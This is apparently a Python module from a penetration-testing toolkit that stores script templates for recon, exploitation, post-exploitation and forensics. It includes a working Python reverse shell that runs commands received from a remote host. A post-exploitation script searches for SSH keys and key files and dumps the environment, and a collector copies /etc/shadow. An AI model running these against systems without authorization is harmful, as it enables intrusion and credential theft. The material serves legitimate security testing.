"""Built-in script templates for common pentest tasks."""
from __future__ import annotations

from typing import TypedDict


class TemplateInfo(TypedDict):
    description: str
    category: str
    language: str
    tags: list[str]
    deps: list[str]
    content: str


TEMPLATES: dict[str, TemplateInfo] = {
    "recon/nmap-quick": {
        "description": "Quick Nmap TCP scan with service detection",
        "category": "recon",
        "language": "bash",
        "tags": ["nmap", "port-scan", "recon"],
        "deps": ["nmap"],
        "content": """\
#!/usr/bin/env bash
# Template: recon/nmap-quick
# Usage: ./nmap_quick.sh <target>
set -euo pipefail

TARGET="${1:?Usage: $0 <target>}"
OUTPUT="nmap_${TARGET//\\/_}.txt"

echo "[*] Quick TCP scan on $TARGET"
nmap -sV -sC -T4 --open -oN "$OUTPUT" "$TARGET"
echo "[+] Results saved to $OUTPUT"
""",
    },

    "recon/subdomain-enum": {
        "description": "Subdomain enumeration via DNS brute-force (stdlib only)",
        "category": "recon",
        "language": "python",
        "tags": ["subdomain", "dns", "enum", "recon"],
        "deps": [],
        "content": """\
#!/usr/bin/env python3
# Template: recon/subdomain-enum
# Usage: python3 subdomain_enum.py <domain> <wordlist>
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed


def check_subdomain(sub: str, domain: str) -> tuple[str, str] | None:
    fqdn = f"{sub}.{domain}"
    try:
        ip = socket.gethostbyname(fqdn)
        return fqdn, ip
    except socket.gaierror:
        return None


def main() -> int:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <domain> <wordlist>")
        return 1
    domain = sys.argv[1]
    wordlist = sys.argv[2]

    with open(wordlist) as f:
        words = [line.strip() for line in f if line.strip()]

    found = 0
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(check_subdomain, w, domain): w for w in words}
        for future in as_completed(futures):
            result = future.result()
            if result:
                fqdn, ip = result
                print(f"[+] {fqdn:<40} {ip}")
                found += 1

    print(f"\\n[*] Found {found} subdomains for {domain}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
""",
    },

    "exploit/revshell-python": {
        "description": "Python reverse shell skeleton (authorized testing only)",
        "category": "exploit",
        "language": "python",
        "tags": ["revshell", "exploit"],
        "deps": [],
        "content": """\
#!/usr/bin/env python3
# Template: exploit/revshell-python
# IMPORTANT: For authorized penetration testing only.
# Usage: python3 revshell.py <lhost> <lport>
import socket
import subprocess
import sys


def connect(host: str, port: int) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.send(b"[*] Connected\\n")
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd or cmd.lower() in ("exit", "quit"):
                break
            try:
                out = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
                )
                s.send(out or b"(no output)\\n")
            except subprocess.CalledProcessError as e:
                s.send(e.output or b"(error)\\n")
            except subprocess.TimeoutExpired:
                s.send(b"(command timed out)\\n")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <lhost> <lport>")
        sys.exit(1)
    connect(sys.argv[1], int(sys.argv[2]))
""",
    },

    "post-exploit/sysinfo": {
        "description": "System information gathering for post-exploitation",
        "category": "post-exploit",
        "language": "bash",
        "tags": ["sysinfo", "enumeration", "post-exploit"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: post-exploit/sysinfo
# Gathers system information for post-exploitation enumeration
set -euo pipefail

sep() { echo ""; echo "=== $1 ==="; }

sep "SYSTEM"
uname -a

sep "CURRENT USER"
id && whoami

sep "NETWORK INTERFACES"
ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "N/A"

sep "LISTENING PORTS"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "N/A"

sep "SUDO RIGHTS"
sudo -l 2>/dev/null || echo "N/A (no sudo or not allowed)"

sep "SUID BINARIES (top 20)"
find / -perm -4000 -type f 2>/dev/null | head -20

sep "WRITABLE DIRECTORIES"
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null

sep "CRONTABS"
crontab -l 2>/dev/null || echo "(none for current user)"
ls /etc/cron* 2>/dev/null || true

sep "INTERESTING FILES"
find /home /root -name "*.txt" -o -name "*.key" -o -name "id_rsa" 2>/dev/null | head -20

sep "ENVIRONMENT"
env | sort
""",
    },

    "post-exploit/persistence-check": {
        "description": "Check common persistence mechanisms on Linux",
        "category": "post-exploit",
        "language": "bash",
        "tags": ["persistence", "post-exploit", "forensic"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: post-exploit/persistence-check
# Checks common persistence locations on Linux
set -euo pipefail

sep() { echo ""; echo "=== $1 ==="; }

sep "CRONTABS (all users)"
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v '^#' | grep -v '^$' \
        && echo "  ↑ user: $user" || true
done
cat /etc/cron* /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -v '^$' || true

sep "SYSTEMD SERVICES (non-standard)"
systemctl list-units --type=service --state=enabled 2>/dev/null \
    | grep -v '/lib/systemd' | grep -v '/usr/lib/systemd' || true

sep "INIT.D SCRIPTS"
ls /etc/init.d/ 2>/dev/null || true

sep "BASHRC / PROFILE HOOKS"
for f in /etc/profile /etc/bashrc ~/.bashrc ~/.profile ~/.bash_profile; do
    [ -f "$f" ] && echo "--- $f ---" && cat "$f" || true
done

sep "AUTHORIZED KEYS"
find /home /root -name "authorized_keys" -exec echo "--- {} ---" \\; -exec cat {} \\; 2>/dev/null || true

sep "SUID/SGID BINARIES"
find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null
""",
    },

    "forensic/log-collect": {
        "description": "Collect system logs for forensic analysis",
        "category": "forensic",
        "language": "bash",
        "tags": ["logs", "forensic", "collect"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: forensic/log-collect
# Collect logs and system state to a forensic directory
set -euo pipefail

OUTPUT_DIR="${1:-./forensic_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUTPUT_DIR"
echo "[*] Collecting to $OUTPUT_DIR"

# Logs
cp -r /var/log "$OUTPUT_DIR/var_log" 2>/dev/null || true
journalctl --no-pager -n 10000 > "$OUTPUT_DIR/journal.txt" 2>/dev/null || true

# Processes and network
ps auxf > "$OUTPUT_DIR/processes.txt" 2>/dev/null
ss -anp > "$OUTPUT_DIR/ss.txt" 2>/dev/null || netstat -anp > "$OUTPUT_DIR/netstat.txt" 2>/dev/null || true
ip route > "$OUTPUT_DIR/routes.txt" 2>/dev/null || true

# Users and sessions
last > "$OUTPUT_DIR/last.txt" 2>/dev/null || true
lastb > "$OUTPUT_DIR/lastb.txt" 2>/dev/null || true
who > "$OUTPUT_DIR/who.txt" 2>/dev/null || true
w > "$OUTPUT_DIR/w.txt" 2>/dev/null || true

# Users / groups
cp /etc/passwd "$OUTPUT_DIR/passwd.txt"
cp /etc/group "$OUTPUT_DIR/group.txt"
cp /etc/shadow "$OUTPUT_DIR/shadow.txt" 2>/dev/null || true

# Hash manifest
find "$OUTPUT_DIR" -type f | sort | xargs sha256sum > "$OUTPUT_DIR/MANIFEST.sha256" 2>/dev/null || true

echo "[+] Collection complete: $OUTPUT_DIR"
echo "[+] Manifest: $OUTPUT_DIR/MANIFEST.sha256"
""",
    },

    "custom/skeleton-bash": {
        "description": "Bash script skeleton with argument parsing",
        "category": "custom",
        "language": "bash",
        "tags": ["template", "skeleton", "bash"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Script:      <name>
# Description: <description>
# Author:      <author>
# Usage:       ./<name>.sh [options] <target>
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VERBOSE=false

usage() {
    cat <<EOF
Usage: $(basename "$0") [options] <target>

Options:
  -v, --verbose   Enable verbose output
  -o, --output    Output file (default: stdout)
  -h, --help      Show this help
EOF
    exit 1
}

log()  { echo "[*] $*"; }
ok()   { echo "[+] $*"; }
err()  { echo "[-] $*" >&2; }
dbg()  { "$VERBOSE" && echo "[D] $*" || true; }

main() {
    local target=""
    local output=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -v|--verbose) VERBOSE=true ;;
            -o|--output)  output="$2"; shift ;;
            -h|--help)    usage ;;
            -*)           err "Unknown option: $1"; usage ;;
            *)            target="$1" ;;
        esac
        shift
    done

    [[ -z "$target" ]] && { err "Target required"; usage; }

    log "Starting against $target"
    # ── Your code here ──────────────────────────────────────────────────────

    # ────────────────────────────────────────────────────────────────────────
    ok "Done."
}

main "$@"
""",
    },

    "custom/skeleton-python": {
        "description": "Python script skeleton with argparse and logging",
        "category": "custom",
        "language": "python",
        "tags": ["template", "skeleton", "python"],
        "deps": [],
        "content": """\
#!/usr/bin/env python3
# Script:      <name>
# Description: <description>
# Author:      <author>
import argparse
import logging
import sys

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="<description>")
    parser.add_argument("target", help="Target host, IP, or file")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    log.info("Starting against %s", args.target)

    # ── Your code here ───────────────────────────────────────────────────────

    # ────────────────────────────────────────────────────────────────────────

    log.info("Done.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
""",
    },
}


def list_templates() -> list[tuple[str, str, str, str]]:
    """Return (name, category, language, description) for all templates."""
    return [
        (name, t["category"], t["language"], t["description"])
        for name, t in sorted(TEMPLATES.items())
    ]


def get_template(name: str) -> TemplateInfo | None:
    """Return template by exact name, or None if not found."""
    return TEMPLATES.get(name)


def search_templates(keyword: str) -> list[str]:
    """Return template names matching keyword in name, description, or tags."""
    kw = keyword.lower()
    return [
        name
        for name, t in TEMPLATES.items()
        if kw in name.lower()
        or kw in t["description"].lower()
        or any(kw in tag for tag in t["tags"])
    ]
